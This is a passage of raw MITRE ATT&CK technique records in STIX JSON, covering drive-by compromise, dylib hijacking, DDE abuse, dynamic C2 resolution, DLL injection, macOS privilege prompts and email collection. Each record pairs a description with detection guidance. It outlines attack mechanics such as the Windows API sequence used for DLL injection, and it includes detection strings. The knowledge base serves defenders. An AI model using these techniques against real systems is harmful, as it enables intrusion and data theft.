2017\",\"url\":\"https://www.volexity.com/blog/2017/11/06/oceanlotus-blossoms-mass-digital-surveillance-and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society/\"}],\"id\":\"attack-pattern--d742a578-d70e-4d0e-96a6-02a9c30204e6\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2020-03-29T23:48:15.056Z\",\"name\":\"Drive-by Compromise\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services)\",\"Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC)\"],\"x_mitre_data_sources\":[\"Packet capture\",\"Network device logs\",\"Process use of network\",\"Web proxy\",\"Network intrusion detection system\",\"SSL/TLS inspection\"],\"x_mitre_detection\":\"Firewalls and proxies can inspect URLs for potentially known-bad domains or parameters. They can also do reputation-based analytics on websites and their requested resources such as how old a domain is, who it\'s registered to, if it\'s on a known bad list, or how many other users have connected to it before.\\n\\nNetwork intrusion detection systems, sometimes with SSL/TLS MITM inspection, can be used to look for known malicious scripts (recon, heap spray, and browser identification scripts have been frequently reused), common script obfuscation, and exploit code.\\n\\nDetecting compromise based on the drive-by exploit from a legitimate website may be difficult. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of browser processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\",\"Linux\",\"macOS\",\"SaaS\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1157\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1157\"},{\"external_id\":\"CAPEC-471\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/471.html\"},{\"description\":\"Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.\",\"source_name\":\"Writing Bad Malware for OSX\",\"url\":\"https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf\"},{\"description\":\"Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.\",\"source_name\":\"Malware Persistence on OS X\",\"url\":\"https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf\"}],\"id\":\"attack-pattern--aa8bfbc9-78dc-41a4-a03b-7453e0fdccda\",\"modified\":\"2020-03-19T15:09:47.005Z\",\"name\":\"Dylib Hijacking\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-16T15:23:30.896Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may execute their own malicious payloads by hijacking ambiguous paths  used to load libraries. Adversaries may plant trojan dynamic libraries, in a directory that will be searched by the operating system before the legitimate library specified by the victim program, so that their malicious library will be loaded into the victim program instead.  MacOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths.\\n\\nA common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) (Citation: Malware Persistence on OS X)\\n\\nIf the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level.\",\"external_references\":[{\"external_id\":\"T1574.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1574/004\"},{\"external_id\":\"CAPEC-CAPEC\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/CAPEC.html\"},{\"description\":\"Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.\",\"source_name\":\"Writing Bad Malware for OSX\",\"url\":\"https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf\"},{\"description\":\"Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.\",\"source_name\":\"Malware Persistence on OS X\",\"url\":\"https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf\"}],\"id\":\"attack-pattern--fc742192-19e3-466c-9eb5-964a97b29490\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:06:47.115Z\",\"name\":\"Dylib Hijacking\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"File monitoring\"],\"x_mitre_defense_bypassed\":[\"Application control\"],\"x_mitre_detection\":\"Objective-See\'s Dylib Hijacking Scanner can be used to detect potential cases of dylib hijacking. Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"external_references\":[{\"external_id\":\"T1173\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1173\"},{\"description\":\"Cimpanu, C. (2017, December 15). Microsoft Disables DDE Feature in Word to Prevent Further Malware Attacks. Retrieved December 19, 2017.\",\"source_name\":\"BleepingComputer DDE Disabled in Word Dec 2017\",\"url\":\"https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/\"},{\"description\":\"Microsoft. (2017, December 12). ADV170021 - Microsoft Office Defense in Depth Update. Retrieved February 3, 2018.\",\"source_name\":\"Microsoft ADV170021 Dec 2017\",\"url\":\"https://portal.msrc.microsoft.com/security-guidance/advisory/ADV170021\"},{\"description\":\"Microsoft. (2017, November 8). Microsoft Security Advisory 4053440 - Securely opening Microsoft Office documents that contain Dynamic Data Exchange (DDE) fields. Retrieved November 21, 2017.\",\"source_name\":\"Microsoft DDE Advisory Nov 2017\",\"url\":\"https://technet.microsoft.com/library/security/4053440\"},{\"description\":\"El-Sherei, S. (2016, May 20). PowerShell, C-Sharp and DDE The Power Within. Retrieved November 22, 2017.\",\"source_name\":\"SensePost PS DDE May 2016\",\"url\":\"https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/\"},{\"description\":\"Kettle, J. (2014, August 29). Comma Separated Vulnerabilities. Retrieved November 22, 2017.\",\"source_name\":\"Kettle CSV DDE Aug 2014\",\"url\":\"https://www.contextis.com/blog/comma-separated-vulnerabilities\"},{\"description\":\"Nelson, M. (2018, January 29). Reviving DDE: Using OneNote and Excel for Code Execution. Retrieved February 3, 2018.\",\"source_name\":\"Enigma Reviving DDE Jan 2018\",\"url\":\"https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee\"},{\"description\":\"Stalmans, E., El-Sherei, S. (2017, October 9). Macro-less Code Exec in MSWord. Retrieved November 21, 2017.\",\"source_name\":\"SensePost MacroLess DDE Oct 2017\",\"url\":\"https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\"},{\"description\":\"NVISO Labs. (2017, October 11). Detecting DDE in MS Office documents. Retrieved November 21, 2017.\",\"source_name\":\"NVisio Labs DDE Detection Oct 2017\",\"url\":\"https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/\"}],\"id\":\"attack-pattern--edbe24e9-aec4-4994-ac75-6a6bc7f1ddd0\",\"modified\":\"2020-03-09T13:00:18.698Z\",\"name\":\"Dynamic Data Exchange\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-12T14:10:50.699Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\\n\\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)\\n\\nMicrosoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).\",\"external_references\":[{\"external_id\":\"T1559.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1559/002\"},{\"description\":\"Cimpanu, C. (2017, December 15). Microsoft Disables DDE Feature in Word to Prevent Further Malware Attacks. Retrieved December 19, 2017.\",\"source_name\":\"BleepingComputer DDE Disabled in Word Dec 2017\",\"url\":\"https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/\"},{\"description\":\"Microsoft. (2017, December 12). ADV170021 - Microsoft Office Defense in Depth Update. Retrieved February 3, 2018.\",\"source_name\":\"Microsoft ADV170021 Dec 2017\",\"url\":\"https://portal.msrc.microsoft.com/security-guidance/advisory/ADV170021\"},{\"description\":\"Microsoft. (2017, November 8). Microsoft Security Advisory 4053440 - Securely opening Microsoft Office documents that contain Dynamic Data Exchange (DDE) fields. Retrieved November 21, 2017.\",\"source_name\":\"Microsoft DDE Advisory Nov 2017\",\"url\":\"https://technet.microsoft.com/library/security/4053440\"},{\"description\":\"El-Sherei, S. (2016, May 20). PowerShell, C-Sharp and DDE The Power Within. Retrieved November 22, 2017.\",\"source_name\":\"SensePost PS DDE May 2016\",\"url\":\"https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/\"},{\"description\":\"Kettle, J. (2014, August 29). Comma Separated Vulnerabilities. Retrieved November 22, 2017.\",\"source_name\":\"Kettle CSV DDE Aug 2014\",\"url\":\"https://www.contextis.com/blog/comma-separated-vulnerabilities\"},{\"description\":\"Nelson, M. (2018, January 29). Reviving DDE: Using OneNote and Excel for Code Execution. Retrieved February 3, 2018.\",\"source_name\":\"Enigma Reviving DDE Jan 2018\",\"url\":\"https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee\"},{\"description\":\"Stalmans, E., El-Sherei, S. (2017, October 9). Macro-less Code Exec in MSWord. Retrieved November 21, 2017.\",\"source_name\":\"SensePost MacroLess DDE Oct 2017\",\"url\":\"https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\"},{\"description\":\"NVISO Labs. (2017, October 11). Detecting DDE in MS Office documents. Retrieved November 21, 2017.\",\"source_name\":\"NVisio Labs DDE Detection Oct 2017\",\"url\":\"https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/\"}],\"id\":\"attack-pattern--232a7e42-cd6e-4902-8fe9-2960f529dd4d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-03-28T19:32:56.572Z\",\"name\":\"Dynamic Data Exchange\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"DLL monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).\\n\\nOLE and Office Open XML files can be scanned for ‘DDEAUTO\', ‘DDE’, and other strings indicative of DDE execution.(Citation: NVisio Labs DDE Detection Oct 2017)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-10T17:28:11.747Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware\'s communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\\n\\nAdversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)\",\"external_references\":[{\"external_id\":\"T1568\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1568\"},{\"description\":\"Brumaghin, E. et al. (2017, September 18). CCleanup: A Vast Number of Machines at Risk. Retrieved March 9, 2018.\",\"source_name\":\"Talos CCleanup 2017\",\"url\":\"http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html\"},{\"description\":\"Dunwoody, M.. (2017, April 3). Dissecting One of APT29’s Fileless WMI and PowerShell Backdoors (POSHSPY). Retrieved April 5, 2017.\",\"source_name\":\"FireEye POSHSPY April 2017\",\"url\":\"https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html\"},{\"description\":\"ESET. (2017, December 21). Sednit update: How Fancy Bear Spent the Year. Retrieved February 18, 2019.\",\"source_name\":\"ESET Sednit 2017 Activity\",\"url\":\"https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/\"},{\"description\":\"Jacobs, J. (2014, October 2). Building a DGA Classifier: Part 2, Feature Engineering. Retrieved February 18, 2019.\",\"source_name\":\"Data Driven Security DGA\",\"url\":\"https://datadrivensecurity.info/blog/posts/2014/Oct/dga-part2/\"}],\"id\":\"attack-pattern--7bd9c723-2f78-4309-82c5-47cad406572b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-27T20:54:28.560Z\",\"name\":\"Dynamic Resolution\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Chris Roffe\"],\"x_mitre_data_sources\":[\"SSL/TLS inspection\",\"Web logs\",\"DNS records\"],\"x_mitre_detection\":\"Detecting dynamically generated C2 can be challenging due to the number of different algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There are multiple approaches to detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more (Citation: Data Driven Security DGA). CDN domains may trigger these detections due to the format of their domain names. In addition to detecting algorithm generated domains based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-14T01:26:08.145Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \\n\\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Endgame Process Injection July 2017) \\n\\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Endgame HuntingNMemory June 2017)(Citation: Endgame Process Injection July 2017) \\n\\nRunning code in the context of another process may allow access to the process\'s memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. \",\"external_references\":[{\"external_id\":\"T1055.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1055/001\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"},{\"description\":\"Desimone, J. (2017, June 13). Hunting in Memory. Retrieved December 7, 2017.\",\"source_name\":\"Endgame HuntingNMemory June 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/hunting-memory\"}],\"id\":\"attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-06-20T22:17:59.148Z\",\"name\":\"Dynamic-link Library Injection\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"DLL monitoring\",\"File monitoring\",\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"Application control\",\"Anti-virus\"],\"x_mitre_detection\":\"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Endgame Process Injection July 2017)\\n\\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \\n\\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-08-08T14:29:37.108Z\",\"external_references\":[{\"external_id\":\"T1514\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1514\"},{\"description\":\"Apple. (n.d.). Apple Developer Documentation - AuthorizationExecuteWithPrivileges. Retrieved August 8, 2019.\",\"source_name\":\"AppleDocs AuthorizationExecuteWithPrivileges\",\"url\":\"https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg\"},{\"description\":\"Patrick Wardle. (2017). Death by 1000 installers; it\'s all broken!. Retrieved August 8, 2019.\",\"source_name\":\"Death by 1000 installers; it\'s all broken!\",\"url\":\"https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken?slide=8\"},{\"description\":\"Carbon Black Threat Analysis Unit. (2019, February 12). New macOS Malware Variant of Shlayer (OSX) Discovered. Retrieved August 8, 2019.\",\"source_name\":\"Carbon Black Shlayer Feb 2019\",\"url\":\"https://www.carbonblack.com/2019/02/12/tau-threat-intelligence-notification-new-macos-malware-variant-of-shlayer-osx-discovered/\"},{\"description\":\"Patrick Wardle. (2018, February 17). Tearing Apart the Undetected (OSX)Coldroot RAT. Retrieved August 8, 2019.\",\"source_name\":\"OSX Coldroot RAT\",\"url\":\"https://objective-see.com/blog/blog_0x2A.html\"}],\"id\":\"attack-pattern--101c3a64-9ba5-46c9-b573-5c501053cbca\",\"modified\":\"2020-02-05T20:13:51.857Z\",\"name\":\"Elevated Execution with Prompt\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-30T14:40:20.187Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code> API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. \\n\\nAlthough this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\\n\\nAdversaries may abuse <code>AuthorizationExecuteWithPrivileges</code> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it\'s all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it\'s all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it\'s all broken!)\",\"external_references\":[{\"external_id\":\"T1548.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1548/004\"},{\"description\":\"Apple. (n.d.). Apple Developer Documentation - AuthorizationExecuteWithPrivileges. Retrieved August 8, 2019.\",\"source_name\":\"AppleDocs AuthorizationExecuteWithPrivileges\",\"url\":\"https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg\"},{\"description\":\"Patrick Wardle. (2017). Death by 1000 installers; it\'s all broken!. Retrieved August 8, 2019.\",\"source_name\":\"Death by 1000 installers; it\'s all broken!\",\"url\":\"https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken?slide=8\"},{\"description\":\"Carbon Black Threat Analysis Unit. (2019, February 12). New macOS Malware Variant of Shlayer (OSX) Discovered. Retrieved August 8, 2019.\",\"source_name\":\"Carbon Black Shlayer Feb 2019\",\"url\":\"https://www.carbonblack.com/2019/02/12/tau-threat-intelligence-notification-new-macos-malware-variant-of-shlayer-osx-discovered/\"},{\"description\":\"Patrick Wardle. (2018, February 17). Tearing Apart the Undetected (OSX)Coldroot RAT. Retrieved August 8, 2019.\",\"source_name\":\"OSX Coldroot RAT\",\"url\":\"https://objective-see.com/blog/blog_0x2A.html\"}],\"id\":\"attack-pattern--b84903f0-c7d5-435d-a69e-de47cc3578c0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-27T12:04:37.823Z\",\"name\":\"Elevated Execution with Prompt\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Jimmy Astle, @AstleJimmy, Carbon Black\",\"Erika Noerenberg, @gutterchurl, Carbon Black\"],\"x_mitre_data_sources\":[\"API monitoring\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Consider monitoring for <code>/usr/libexec/security_authtrampoline</code> executions which may indicate that <code>AuthorizationExecuteWithPrivileges</code> is being executed. MacOS system logs may also indicate when <code>AuthorizationExecuteWithPrivileges</code> is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.\",\"x_mitre_effective_permissions\":[\"root\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-21T21:08:33.237Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).(Citation: Microsoft Exchange Address Lists)\\n\\nIn on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)\",\"external_references\":[{\"external_id\":\"T1087.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1087/003\"},{\"description\":\"Microsoft. (2020, February 7). Address lists in Exchange Server. Retrieved March 26, 2020.\",\"source_name\":\"Microsoft Exchange Address Lists\",\"url\":\"https://docs.microsoft.com/en-us/exchange/email-addresses-and-address-books/address-lists/address-lists?view=exchserver-2019\"},{\"description\":\"Microsoft. (n.d.). Get-GlobalAddressList. Retrieved October 6, 2019.\",\"source_name\":\"Microsoft getglobaladdresslist\",\"url\":\"https://docs.microsoft.com/en-us/powershell/module/exchange/email-addresses-and-address-books/get-globaladdresslist\"},{\"description\":\"Bullock, B.. (2016, October 3). Attacking Exchange with MailSniper. Retrieved October 6, 2019.\",\"source_name\":\"Black Hills Attacking Exchange MailSniper, 2016\",\"url\":\"https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/\"}],\"id\":\"attack-pattern--4bc31b94-045b-4752-8920-aebaebdb6470\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-26T15:27:58.933Z\",\"name\":\"Email Account\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Office 365 account logs\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\",\"Office 365\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:25.454Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. \",\"external_references\":[{\"external_id\":\"T1114\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1114\"},{\"description\":\"McMichael, T.. (2015, June 8). Exchange and Office 365 Mail Forwarding. Retrieved October 8, 2019.\",\"source_name\":\"Microsoft Tim McMichael Exchange Mail Forwarding 2\",\"url\":\"https://blogs.technet.microsoft.com/timmcmic/2015/06/08/exchange-and-office-365-mail-forwarding-2/\"}],\"id\":\"attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-03-24T18:31:06.417Z\",\"name\":\"Email Collection\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Swetha Prabakaran, Microsoft Threat Intelligence Center (MSTIC)\"],\"x_mitre_data_sources\":[\"Office 365 trace logs\",\"Mail server\",\"Email gateway\",\"Authentication logs\",\"File monitoring\",\"Process monitoring\",\"Process use of network\"],\"x_mitre_detection\":\"There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.\\n\\nFile access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\\n\\nDetection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account.\\n\\nAuto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include <code>X-MS-Exchange-Organization-AutoForwarded</code> set to true, <code>X-MailFwdBy</code> and <code>X-Forwarded-To</code>. 